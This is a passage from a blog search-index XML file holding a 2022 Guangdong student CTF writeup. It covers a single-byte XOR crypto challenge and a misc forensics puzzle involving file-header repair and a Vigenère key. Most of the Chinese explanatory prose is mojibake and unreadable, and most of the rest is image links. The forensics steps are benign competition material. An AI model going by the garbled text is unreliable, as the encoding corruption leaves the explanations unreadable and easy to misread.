src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image021.png" alt="img"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="xor2"><a href="#xor2" class="headerlink" title="xor2"></a>xor2</h2><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image023.png" alt="img"></p><p>é˜…è¯»æºç å‘ç°ï¼Œå°±æ˜¯ä¸€ä¸ªæœªçŸ¥çš„keyï¼Œé€ä¸ªå¼‚æˆ–flagï¼ŒçŒœæµ‹flagå­—ç¬¦ä¸²å¼€å¤´ç¬¬ä¸€ä¸ªåº”è¯¥ä¸ºfï¼Œæµ‹è¯•ä¸€ä¸‹ç¬¬ç¬¬ä¸€ä¸ªå¯†æ–‡å’Œfçš„asciiç è¿›è¡Œå¼‚æˆ–ï¼Œç»“æœä¸º120ï¼Œè¿™å°±æ˜¯keyï¼Œç„¶åå°†å¯†æ–‡é€ä¸ªå¼‚æˆ–120ï¼Œå¾—åˆ°flag</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image025.png" alt="img"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="å¤åˆ"><a href="#å¤åˆ" class="headerlink" title="å¤åˆ"></a>å¤åˆ</h2><p>å°†æ•°æ®åŒ…æ‰€ä»¥çš„httpå¯¹è±¡å¯¼å‡º</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image026.png" alt="img"></p><p>åˆ†æå‘ç°&#96;flaggggggg.exeä¸ºD0CF11E0å¤´éƒ¨ï¼Œä¸ºdocæ–‡ä»¶</p><p>æ‰“å¼€å‘ç°key</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image028.png" alt="img"></p><p>å‘ç°pass.md,ä¸ºzipæ–‡ä»¶ï¼Œç¼ºå°‘504Bæ–‡ä»¶å¤´å­—èŠ‚</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image029.png" alt="img"></p><p>ä¿®æ”¹ä¸ºzipæ–‡ä»¶è§£å‹ï¼Œè·å–æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image030.png" alt="img"></p><p>&#x3D;E2&#x3D;80&#x3D;82åœ¨unicodeé‡Œé¢è¿™ä¸ªä¸ºç©ºæ ¼ï¼Œå› æ­¤æ›¿æ¢ä¸ºç©º</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image032.png" alt="img"></p><p>å°è¯•å‘ç°ç»´å‰å°¼äºšè§£å¯†ï¼Œkeyä¸º<code>everything</code></p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image033.png" alt="img"></p><h2 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h2><p>â€¦</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> ç¬¬äºŒå±Šå¹¿ä¸œçœå¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æ”»é˜²å¤§èµ›åˆèµ› </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
